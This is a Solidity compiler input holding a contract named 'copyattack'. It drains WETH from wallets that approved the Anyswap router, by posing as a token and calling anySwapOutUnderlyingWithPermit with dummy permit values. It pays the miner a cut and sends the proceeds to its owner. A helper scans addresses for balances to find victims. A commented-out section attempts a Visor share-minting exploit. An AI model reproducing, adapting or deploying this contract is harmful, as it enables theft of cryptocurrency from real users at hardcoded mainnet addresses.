{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/dark1.sol":{"content":"pragma solidity =0.6.6;\r\npragma experimental ABIEncoderV2;\r\n\r\n\r\n/*\r\ninterface visor{\r\n\r\n    function deposit(\r\n            uint256 visrDeposit,\r\n            address payable from,\r\n            address to\r\n        ) external returns (uint256 shares);\r\n\r\n}*/\r\n\r\ninterface IWETH{\r\n    function deposit() external payable;\r\n    function withdraw(uint wad) external;\r\n}\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint value) external returns (bool);\r\n}\r\ninterface AnyswapV1ERC20 {\r\n    // function underlying() external view returns (address);\r\nfunction anySwapOutUnderlyingWithPermit(\r\n        address from,\r\n        address token,\r\n        address to,\r\n        uint amount,\r\n        uint deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s,\r\n        uint toChainID\r\n    ) external;\r\n}\r\n\r\n\r\n\r\ncontract copyattack {\r\n\r\n    bool minted = true;\r\n\r\n    address payable public towner;\r\n    \r\n\r\n    constructor() public {\r\n        towner = msg.sender;\r\n        \r\n\r\n    }\r\n    \r\n    \r\n    modifier onlyowner{\r\n        require(msg.sender == towner);\r\n        _;\r\n    }\r\n\r\n    function owner() external returns(address r){\r\n\r\n        return(address(this));\r\n\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n\r\n    function deposit() payable external{\r\n    }\r\n\r\n\r\n    function _safeTransfer(address token, address to, uint value) private {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(bytes4(keccak256(bytes('transfer(address,uint256)'))), to, value));\r\n    }\r\n    \r\n    function withdrawtoken(address tokenaddr, uint amount) external onlyowner{\r\n        _safeTransfer(tokenaddr, towner, amount);\r\n    }\r\n    \r\n\r\n    function withdrawethamount(uint amount) external onlyowner {\r\n        msg.sender.transfer(amount);\r\n    }\r\n\r\n\r\n\r\n\r\n    /*\r\n    function delegatedTransferERC20(address t, address t2, uint256 amount) external{\r\n        if(minted){\r\n            minted = false;\r\n            visor(address(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef)).deposit( 100000000000000000000000000, address(this), tx.origin);\r\n\r\n        }\r\n        \r\n    }\r\n\r\n    function copyyou() external {\r\n        visor(address(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef)).deposit( 100000000000000000000000000, address(this), tx.origin);\r\n\r\n    }\r\n    */\r\n    function underlying() external view returns (address){\r\n        return(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));\r\n    }\r\n\r\n    function depositVault(uint amount, address to) external returns (uint){\r\n        return(0);\r\n    }\r\n\r\n    function burn(address from, uint256 amount) external returns (bool){\r\n        return(true);\r\n    }\r\n\r\n    function copyyouattack(address spender,uint256 amount, uint256 percent) external {\r\n        uint256 gasstart = gasleft();\r\n        uint256 targetbalance = IERC20(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).balanceOf(spender);\r\n        require(targetbalance >= amount, \"shit\");\r\n\r\n        bytes32 byteText = \"0\";\r\n\r\n        AnyswapV1ERC20(address(0x6b7a87899490EcE95443e979cA9485CBE7E71522)).anySwapOutUnderlyingWithPermit(spender, address(this), address(this), amount, 100000000000000000000 , 0, \r\n        byteText,  byteText, 56);\r\n\r\n        IWETH(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).withdraw(amount);\r\n\r\n        block.coinbase.call{value: amount * percent / 100}(new bytes(0));\r\n\r\n\r\n        require(address(this).balance > tx.gasprice * (gasstart - gasleft()), \"i\");\r\n\r\n        towner.transfer(address(this).balance);\r\n\r\n    }\r\n\r\n    function batchfetchbalance(address[] memory addrlist) public returns(uint256[] memory balances){\r\n        balances = new uint256[](addrlist.length);\r\n\r\n        for(uint256 i = 0 ; i < addrlist.length; i++){\r\n            balances[i] = IERC20(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).balanceOf(addrlist[i]);\r\n        }\r\n\r\n    }\r\n\r\n}"}}}